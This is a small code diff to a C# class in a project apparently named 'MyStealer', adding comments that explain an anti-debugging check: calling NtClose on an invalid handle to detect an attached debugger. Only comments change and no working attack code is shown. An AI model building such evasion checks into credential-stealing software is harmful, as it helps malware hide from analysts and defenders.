@@ -4,7 +4,10 @@ using static MyStealer.AntiDebug.NativeCalls;
 namespace MyStealer.AntiDebug.Check.Exploits
 {
     /// <summary>
-    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs
+    /// Tries to call NtClose with an invalid handle.
+    /// Then, the NtClose function will just return FALSE on genuine executing environment.
+    /// But it will be likely to raise any errors if some kind of debuggers are attached.
+    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs#L76
     /// </summary>
     public class CloseInvalidHandle : CheckBase
     {
